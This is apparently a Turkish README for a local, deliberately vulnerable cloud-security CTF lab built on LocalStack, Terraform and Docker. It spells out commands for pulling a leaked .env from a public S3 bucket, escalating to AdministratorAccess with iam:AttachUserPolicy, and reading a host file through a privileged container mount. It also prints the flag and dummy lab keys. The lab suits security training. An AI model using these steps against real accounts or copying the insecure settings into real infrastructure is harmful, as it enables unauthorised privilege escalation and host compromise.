# ☁️ Cloud Security Lab — HTB Style CTF

> **Yerel AWS ortamında S3 sızıntısından başlayıp Docker konteyner kaçışına uzanan 3 aşamalı bir bulut güvenliği CTF laboratuvarı.**

---

## 📋 İçindekiler

- [Senaryo ve Amaç](#senaryo-ve-amaç)
- [Mimari](#mimari)
- [Kurulum](#kurulum)
- [Aşamalar](#aşamalar)
- [Proje Yapısı](#proje-yapısı)
- [Kullanılan Teknolojiler](#kullanılan-teknolojiler)
- [Güvenlik Uyarısı](#güvenlik-uyarısı)

---

## 🎯 Senaryo ve Amaç

Bu laboratuvar, gerçek dünya bulut güvenliği açıklarını **tamamen yerel, izole bir ortamda** deneyimlemenizi sağlar. Hedef: üç aşamalı bir saldırı zincirini tamamlayarak host sistemdeki gizli bayrağı ele geçirmek.

**Saldırı Zinciri:**
```
S3 Misconfiguration → IAM Privilege Escalation → Container Escape → Root Flag
```

---

## 🏗️ Mimari

```
┌─────────────────────────────────────────────────┐
│                  Host Makine                    │
│                                                 │
│  ┌──────────────┐    ┌────────────────────────┐ │
│  │  LocalStack  │    │  vulnerable-app        │ │
│  │  :4566       │    │  (nginx:alpine)        │ │
│  │              │    │  --privileged          │ │
│  │  ┌─────────┐ │    │  -v /:/host            │ │
│  │  │   S3    │ │    │  :8080                 │ │
│  │  │   IAM   │ │    └────────────────────────┘ │
│  │  │   EC2   │ │                               │
│  │  └─────────┘ │    ┌────────────────────────┐ │
│  └──────────────┘    │  CTF Web UI            │ │
│                      │  index.html            │ │
│  ┌──────────────┐    └────────────────────────┘ │
│  │  Terraform   │                               │
│  │  (IaC)       │                               │
│  └──────────────┘                               │
└─────────────────────────────────────────────────┘
```

**Ağ:** `cloudsec-network` (Docker bridge)

---

## 🚀 Kurulum

### Gereksinimler

- [Docker](https://docs.docker.com/get-docker/) & Docker Compose
- [Terraform](https://developer.hashicorp.com/terraform/install) >= 1.0
- [AWS CLI](https://aws.amazon.com/cli/)

### Tek Komutla Kur

```bash
git clone <repo-url>
cd cloud-security-lab
chmod +x setup.sh
./setup.sh
```

Setup scripti şunları otomatik yapar:
1. LocalStack konteynerini ayağa kaldırır
2. Terraform ile AWS altyapısını (S3, IAM, EC2) oluşturur
3. Zafiyetli nginx konteynerini başlatır
4. CTF arayüzünü `http://localhost:8080` adresinde sunar

---

## 🎮 Aşamalar

### Aşama 1 — S3 Yapılandırma Hatası

Herkese açık S3 bucket'ındaki sızdırılmış `.env` dosyasını bulun:

```bash
aws s3 ls --endpoint-url http://localhost:4566
aws s3 ls s3://cloudsec-public-assets/ --recursive --endpoint-url http://localhost:4566
aws s3 cp s3://cloudsec-public-assets/config/.env . --endpoint-url http://localhost:4566
```

### Aşama 2 — IAM Yetki Yükseltme

Ele geçirilen anahtarlarla `iam:AttachUserPolicy` iznini kullanarak admin olun:

```bash
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7LABTEST
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/LABTEST+KEY
aws iam attach-user-policy \
  --user-name cloudsec-dev-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --endpoint-url http://localhost:4566
```

### Aşama 3 — Konteyner Kaçışı

Privileged modda çalışan konteynerin mount ettiği host dosya sisteminden bayrağı okuyun:

```bash
docker exec -it cloudsec-vulnerable-app sh
cat /host/root/flag.txt
```

**Bayrak:** `FLAG{cl0ud_esc4p3_succ3ss}`

---

## 📁 Proje Yapısı

```
cloud-security-lab/
├── docker-compose.yml       # Servis orkestrasyonu
├── setup.sh                 # Otomatik kurulum scripti
├── index.html               # CTF web arayüzü
└── terraform/
    ├── main.tf              # Provider tanımları (LocalStack)
    ├── variables.tf         # Değişkenler
    ├── s3.tf                # Stage 1: S3 misconfiguration
    ├── iam.tf               # Stage 2: IAM privilege escalation
    ├── ec2.tf               # Stage 3: Vulnerable EC2 + Docker
    └── outputs.tf           # Çıktılar
```

---

## 🛠️ Kullanılan Teknolojiler

| Bileşen | Teknoloji | Amaç |
|---------|-----------|-------|
| AWS Emülasyonu | LocalStack | Gerçek AWS API'sini yerel simüle eder |
| IaC | Terraform + AWS Provider | S3, IAM, EC2 kaynaklarını oluşturur |
| Zafiyetli Uygulama | nginx:alpine (--privileged) | Container escape senaryosu |
| Orkestrasyon | Docker Compose | Tüm servisleri yönetir |
| CTF Arayüzü | Vanilla HTML/CSS/JS | Bayrak doğrulama ve writeup paneli |

---

## ⚠️ Güvenlik Uyarısı

Bu laboratuvar **yalnızca eğitim amaçlıdır.** Tüm "açıklar" kasıtlı olarak tasarlanmış olup yalnızca izole yerel ortamda çalışır.

- `--privileged` konteynerleri production'da **kesinlikle kullanmayın**
- S3 bucket'larınızı herkese açık yapmayın
- Kimlik anahtarlarını kaynak koduna gömmeyin

---

*Hack the Cloud. Learn the Escape.* 🚀
